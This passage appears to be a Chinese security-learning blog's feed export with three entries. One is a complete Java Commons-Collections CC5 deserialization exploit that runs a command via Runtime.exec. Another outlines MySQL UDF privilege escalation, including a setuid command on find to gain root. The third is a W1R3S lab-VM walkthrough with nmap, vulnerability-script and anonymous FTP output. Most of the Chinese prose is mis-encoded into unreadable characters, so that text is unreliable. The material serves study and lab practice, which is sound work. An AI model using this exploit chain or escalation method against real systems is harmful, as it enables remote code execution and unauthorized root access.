class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>BadAttributeValueExpException</code>è¿™ä¸ªç±»çš„readObjectè°ƒç”¨<code>valObj.toString()</code>,<code>valObj</code>çš„å€¼æ˜¯å¯æ§çš„ï¼›å°½ç®¡<code>BadAttributeValueExpException</code>æ²¡æœ‰å®ç° <code>Serializable</code> æ¥å£çš„æƒ…å†µä¸‹,ä»»ç„¶å¯ä»¥åºåˆ—åŒ–</p><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">bclass</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bclass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL UDFææƒ</title>
      <link href="/2025/03/26/MYSQL-UDF%E6%8F%90%E6%9D%83/"/>
      <url>/2025/03/26/MYSQL-UDF%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>udf å…¨ç§°ä¸ºâ€™user defined functionâ€™ï¼Œæ„æ€æ˜¯â€™ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°â€™ã€‚ç”¨æˆ·å¯ä»¥å¯¹<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&spm=1001.2101.3001.7020">æ•°æ®åº“</a>æ‰€ä½¿ç”¨çš„å‡½æ•°è¿›è¡Œä¸€ä¸ªæ‰©å±•ï¼ˆwindowsåˆ©ç”¨dllæ–‡ä»¶ï¼Œlinuxåˆ©ç”¨soæ–‡ä»¶ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹ï¼Œå¾€MySQLé‡Œé¢æ·»åŠ ä¸€ä¸ªå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°å³å¯ã€‚</p><p>UDF ææƒå°±åƒ <strong>â€œåˆ©ç”¨æ•°æ®åº“ç»™è‡ªå·±å¼€åé—¨â€</strong>ã€‚ä¸¾ä¸ªä¾‹å­ï¼šå‡è®¾ä½ å·å·åœ¨å…¬å¸çš„æ‰“å¡æœºé‡Œè£…äº†ä¸€ä¸ªå°ç¨‹åºï¼Œè¿™ä¸ªå°ç¨‹åºæœ¬æ¥åº”è¯¥åªç”¨æ¥è®°å½•è€ƒå‹¤ï¼Œä½†ä½ æŠŠå®ƒæ”¹æˆäº†èƒ½ç›´æ¥å¼€è€æ¿åŠå…¬å®¤çš„é—¨ç¦å¡â€”â€”è¿™å°±æ˜¯ UDF ææƒçš„æ ¸å¿ƒé€»è¾‘ã€‚</p><p>æ•°æ®åº“å°±åƒä¸€å°æ‰‹æœºï¼ŒUDF å°±æ˜¯ç”¨æˆ·è‡ªå·±å®‰è£…çš„ Appã€‚æ­£å¸¸ App ç”¨æ¥å¬æ­Œã€èŠå¤©ï¼Œä½†é»‘å®¢è£…çš„ App å…¶å®æ˜¯å·å¯†ç çš„é—´è°è½¯ä»¶</p><h2 id="äºŒã€åˆ©ç”¨æ¡ä»¶"><a href="#äºŒã€åˆ©ç”¨æ¡ä»¶" class="headerlink" title="äºŒã€åˆ©ç”¨æ¡ä»¶"></a>äºŒã€åˆ©ç”¨æ¡ä»¶</h2><h4 id="1ã€å¸¸è§„æƒ…å†µï¼š"><a href="#1ã€å¸¸è§„æƒ…å†µï¼š" class="headerlink" title="1ã€å¸¸è§„æƒ…å†µï¼š"></a>1ã€å¸¸è§„æƒ…å†µï¼š</h4><p>1.1 mysqlé…ç½®æ–‡ä»¶secure_file_privé¡¹è®¾ç½®ä¸ºç©ºï¼Œï¼ˆå¦‚æœä¸ºNULLæˆ–&#x2F;tmp&#x2F;ç­‰æŒ‡å®šç›®å½•ï¼Œå³æ— æ³•è‡ªå®šä¹‰udfæ–‡ä»¶å¯¼å‡ºä½ç½®ï¼Œåˆ™æ— æ³•åˆ©ç”¨ï¼‰ï¼›</p><p>1.2 CREATEæƒé™ã€FILEæƒé™ï¼ˆrootç”¨æˆ·é»˜è®¤æ‹¥æœ‰æ‰€æœ‰æƒé™ï¼‰ã€‚</p><h4 id="2ã€ç‰¹æ®Šæƒ…å†µï¼š"><a href="#2ã€ç‰¹æ®Šæƒ…å†µï¼š" class="headerlink" title="2ã€ç‰¹æ®Šæƒ…å†µï¼š"></a>2ã€ç‰¹æ®Šæƒ…å†µï¼š</h4><p>2.1 INSERTæƒé™ã€UPDATEæƒé™ã€DELETEæƒé™ã€‚</p><h4 id="ææƒæ­¥éª¤ï¼ˆç®€å•ç‰ˆï¼‰"><a href="#ææƒæ­¥éª¤ï¼ˆç®€å•ç‰ˆï¼‰" class="headerlink" title="ææƒæ­¥éª¤ï¼ˆç®€å•ç‰ˆï¼‰"></a><strong>ææƒæ­¥éª¤ï¼ˆç®€å•ç‰ˆï¼‰</strong></h4><p><strong>ä¼ æ–‡ä»¶</strong>ï¼šæŠŠæ¶æ„ä»£ç ï¼ˆæ¯”å¦‚ <code>udf.so</code>ï¼‰ä¼ åˆ°æœåŠ¡å™¨ä¸Šï¼Œæ¯”å¦‚é€šè¿‡æ•°æ®åº“çš„â€œæ–‡ä»¶å†™å…¥â€åŠŸèƒ½</p><p><strong>å¯¼æ–‡ä»¶</strong>ï¼šç”¨ SQL å‘½ä»¤æŠŠæ–‡ä»¶å¤åˆ¶åˆ°æ•°æ®åº“çš„â€œæ’ä»¶ç›®å½•â€</p><p><strong>é€ å‡½æ•°</strong>ï¼šåœ¨æ•°æ®åº“é‡Œåˆ›å»ºä¸€ä¸ªâ€œè‡ªå®šä¹‰å‡½æ•°â€ï¼Œç»‘å®šè¿™ä¸ªæ¶æ„ä»£ç </p><p><strong>æ‰§è¡Œå‘½ä»¤</strong>ï¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆæ¯”å¦‚ <code>chmod u+s /usr/bin/find</code>ï¼‰ï¼Œç›´æ¥æ‹¿åˆ° root æƒé™</p><p>ç­‰ç¢°åˆ°å“åº”é¶æœº å†å»åšå¤ç°æ‰§è¡Œ ç°åœ¨å…ˆç®€å•äº†è§£ä¸€ä¸‹</p>]]></content>
      
      
      <categories>
          
          <category> ææƒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lW1R3S 1.0.1</title>
      <link href="/2025/03/25/W1R3S%201.0.1/"/>
      <url>/2025/03/25/W1R3S%201.0.1/</url>
      
        <content type="html"><![CDATA[<p>ä¸‹è½½å¥½é¶æœº </p><p>ç„¶åå…ˆåœ¨æœ¬åœ°è¿›è¡Œæ‰«æç¡®å®šé¶æœºçš„ipåœ°å€</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 192.168.205.0/24</span><br></pre></td></tr></table></figure><p>å‘ç°</p><p>Starting Nmap 7.95 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2025-03-25 04:03 EDT<br>Nmap scan report for 192.168.205.1 (192.168.205.1)<br>Host is up (0.0012s latency).<br>MAC Address: 00:50:56:C0:00:01 (VMware)<br>Nmap scan report for 192.168.205.2 (192.168.205.2)<br>Host is up (0.00089s latency).<br>MAC Address: 00:50:56:F7:4F:9C (VMware)<br>Nmap scan report for 192.168.205.136 (192.168.205.136)<br>Host is up (0.00074s latency).<br>MAC Address: 00:0C:29:19:D7:D3 (VMware)<br>Nmap scan report for 192.168.205.254 (192.168.205.254)<br>Host is up (0.00077s latency).<br>MAC Address: 00:50:56:E0:48:99 (VMware)<br>Nmap scan report for 192.168.205.128 (192.168.205.128)<br>Host is up.<br>Nmap done: 256 IP addresses (5 hosts up) scanned in 2.00 seconds</p><p>è¿™æ¡å‘½ä»¤ç­‰åŒäº </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure><p>Interface: eth0, type: EN10MB, MAC: 00:0c:29:e7:49:b2, IPv4: 192.168.205.128<br>WARNING: Cannot open MAC&#x2F;Vendor file ieee-oui.txt: Permission denied<br>WARNING: Cannot open MAC&#x2F;Vendor file mac-vendor.txt: Permission denied<br>Starting arp-scan 1.10.0 with 256 hosts (<a href="https://github.com/royhills/arp-scan">https://github.com/royhills/arp-scan</a>)<br>192.168.205.1   00:50:56:c0:00:01       (Unknown)<br>192.168.205.2   00:50:56:f7:4f:9c       (Unknown)<br>192.168.205.136 00:0c:29:19:d7:d3       (Unknown)<br>192.168.205.254 00:50:56:e0:48:99       (Unknown)</p><p>136æ˜¯æˆ‘ä»¬çš„é¶æœºåœ°å€</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯¹è¿™ä¸ªåœ°å€è¿›è¡Œä¸€ä¸ªtcpçš„æ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 10000 -p- 192.168.205.136 -oA  nmapscan/ports</span><br></pre></td></tr></table></figure><p>Starting Nmap 7.95 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2025-03-25 04:17 EDT<br>Nmap scan report for 192.168.205.136 (192.168.205.136)<br>Host is up (0.00034s latency).<br>Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>21&#x2F;tcp   open  ftp<br>22&#x2F;tcp   open  ssh<br>80&#x2F;tcp   open  http<br>3306&#x2F;tcp open  mysql<br>MAC Address: 00:0C:29:19:D7:D3 (VMware)</p><p>å‘ç°4ä¸ªç«¯å£</p><p>-oA  nmapscan&#x2F;ports è¿™é‡Œæ˜¯ä¸ºäº†æ•°æ®åŒ–æ‰«æç»“æœ</p><p>å¦‚æœæ‰«æè¿‡ç¨‹ä¸­é‡åˆ°çš„ç«¯å£æ•°é‡è¿‡å¤§çš„æƒ…å†µä¸‹æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œä¸€ä¸ªç­›é€‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap</span><br></pre></td></tr></table></figure><p>21&#x2F;tcp   open  ftp<br>22&#x2F;tcp   open  ssh<br>80&#x2F;tcp   open  http<br>3306&#x2F;tcp open  mysql</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap |awk -F<span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line"><span class="number">21</span></span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="number">80</span></span><br><span class="line"><span class="number">3306</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨æ¥ææƒç«¯å£ï¼ˆè¿™ä¸€åˆ‡éƒ½æ˜¯åŸºäºå¦‚æœæ‰«æå‡ºæ¥çš„ç«¯å£æ•°é‡è¿‡å¤§çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦ï¼Œè¿™é‡Œä¸ºäº†å…»æˆä¹ æƒ¯æ‰€ä»¥ç»†è‡´ä¸€äº›ï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap |awk -F&#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27;|paste -sd &#x27;,&#x27;</span><br><span class="line">21,22,80,3306</span><br></pre></td></tr></table></figure><p>å°†ç«¯å£æå–åˆ°ä¸€è¡Œ</p><p>å°†è¿™äº›èµ‹å€¼ç»™portçš„å˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ports=$(grep open nmapscan/ports.nmap |awk -F&#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27;|paste -sd &#x27;,&#x27;)</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å¯¹å…¶è¿›è¡Œè¯¦ç»†ä¿¡æ¯æ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p21,22,80,3306 192.168.205.136 -oA nmapscan/detail</span><br></pre></td></tr></table></figure><p>-sVæ˜¯å¯¹ç½‘ç«™ä¿¡æ¯è¿›è¡Œæ‰«æï¼Œ-sCæ˜¯é»˜è®¤è„šæœ¬ -Oæ˜¯æ“ä½œç³»ç»Ÿ </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.205.128</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content</span><br><span class="line">| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs</span><br><span class="line">|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)</span><br><span class="line">|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)</span><br><span class="line">|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:19:D7:D3 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 5.1 - 5.15 (95%), Linux 3.13 - 4.4 (93%), Linux 3.8 - 3.16 (93%), Linux 4.10 (93%), Linux 3.4 - 3.10 (93%), Linux 3.10 (93%), Linux 3.13 - 3.16 (92%), Linux 4.4 (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.41 seconds</span><br></pre></td></tr></table></figure><p>åœ¨æ‰«æçš„è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸€ä¸‹udpçš„ä¸€ä¸ªæ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sU --top-ports 20 192.168.205.136 -oA nmapscan/udp</span><br><span class="line">[sudo] kali çš„å¯†ç ï¼š</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 05:22 EDT</span><br><span class="line">Nmap scan report for 192.168.205.136 (192.168.205.136)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">53/udp    open|filtered domain</span><br><span class="line">67/udp    open|filtered dhcps</span><br><span class="line">68/udp    open|filtered dhcpc</span><br><span class="line">69/udp    open|filtered tftp</span><br><span class="line">123/udp   open|filtered ntp</span><br><span class="line">135/udp   open|filtered msrpc</span><br><span class="line">137/udp   open|filtered netbios-ns</span><br><span class="line">138/udp   open|filtered netbios-dgm</span><br><span class="line">139/udp   open|filtered netbios-ssn</span><br><span class="line">161/udp   open|filtered snmp</span><br><span class="line">162/udp   open|filtered snmptrap</span><br><span class="line">445/udp   open|filtered microsoft-ds</span><br><span class="line">500/udp   open|filtered isakmp</span><br><span class="line">514/udp   open|filtered syslog</span><br><span class="line">520/udp   open|filtered route</span><br><span class="line">631/udp   open|filtered ipp</span><br><span class="line">1434/udp  open|filtered ms-sql-m</span><br><span class="line">1900/udp  open|filtered upnp</span><br><span class="line">4500/udp  open|filtered nat-t-ike</span><br><span class="line">49152/udp open|filtered unknown</span><br><span class="line">MAC Address: 00:0C:29:19:D7:D3 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.72 second</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰è¿›è¡Œnmap æ¼æ´è„šæœ¬è¿›è¡Œæ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> sudo nmap --script=vuln -p21,80,22,3306 192.168.205.136 -oA nmapscan/vuln</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 05:25 EDT</span><br><span class="line">Nmap scan report for 192.168.205.136 (192.168.205.136)</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 00:0C:29:19:D7:D3 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 322.12 seconds</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡æœ‰å‘ç°å¯åˆ©ç”¨æ¼æ´ ddoså°±ä¸è€ƒè™‘äº† </p><p>ç„¶ååˆ†æåˆšåˆšçš„è¯¦ç»†æ‰«æ</p><p>21&#x2F;tcp   open  ftp     vsftpd 2.0.8 or later</p><p>21ç«¯å£ ftp ä½¿ç”¨çš„æ˜¯vsftpd åç¼€å¸¦dåŸºæœ¬ä¸Šå¯ä»¥ä½¿ç”¨åŒ¿åç™»å½•</p><p>ä¿¡æ¯æ”¶é›†å°±åˆ°è¿™ ç«¯å£æ‰«æ è¯¦ç»†ç«¯å£æ‰«æ udpæ‰«æ åˆ©ç”¨æ¼æ´è„šæœ¬æ‰«æï¼Œå¯èƒ½è¿˜ä¼šæœ‰ipv6çš„æ‰«æ</p><p>åŒ¿åç™»å½•</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ftp 192.168.205.136</span><br><span class="line">Connected to 192.168.205.136.</span><br><span class="line">220 Welcome to W1R3S.inc FTP service.</span><br><span class="line">Name (192.168.205.136:kali): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„ftpè¦åˆ‡æ¢æˆäºŒè¿›åˆ¶æ¨¡å¼ </p><p>å‘ç°ä¸‰ä¸ªç›®å½•</p><p>drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content<br>drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs<br>drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</p><p>åˆ†åˆ«è¿›å…¥ç›®å½•å°†é‡Œé¢çš„txtæ–‡ä»¶ä¸‹è½½ä¸‹æ¥</p><p>å°†ä¸‹è½½çš„æ–‡ä»¶å…¨éƒ¨è¯»å–å‡ºæ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat *.txt        </span><br><span class="line">New FTP Server For W1R3S.inc</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line">01ec2d8fc11c493b25029fb1f47f39ce</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################</span></span></span><br><span class="line">___________.__              __      __  ______________________   _________    .__               </span><br><span class="line">\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  </span><br><span class="line">  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  &lt; \_____  \     |  |/    \_/ ___\ </span><br><span class="line">  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___ </span><br><span class="line">  |____|   |___|  /\___  &gt;   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  &gt;</span><br><span class="line">                \/     \/         \/                \/       \/        \/  \/         \/     \/ </span><br><span class="line">The W1R3S.inc employee list</span><br><span class="line"></span><br><span class="line">Naomi.W - Manager</span><br><span class="line">Hector.A - IT Dept</span><br><span class="line">Joseph.G - Web Design</span><br><span class="line">Albert.O - Web Design</span><br><span class="line">Gina.L - Inventory</span><br><span class="line">Rico.D - Human Resources</span><br><span class="line"></span><br><span class="line">â€‹    Ä± pou,Ê‡ Ê‡É¥Ä±uÊ Ê‡É¥Ä±s Ä±s Ê‡É¥Ç ÊÉÊ Ê‡o É¹ooÊ‡Â¡</span><br><span class="line"></span><br><span class="line">....punoÉ¹É ÆƒuÄ±ÊÉ×Ÿd doÊ‡s â€˜op oÊ‡ ÊÉ¹oÊ ÉŸo Ê‡o×Ÿ É ÇÊŒÉÉ¥ ÇÊ</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨hash-identifier å¯¹åŠ å¯†ç®—æ³•è¿›è¡Œè¯†åˆ«</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hash-identifier </span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - 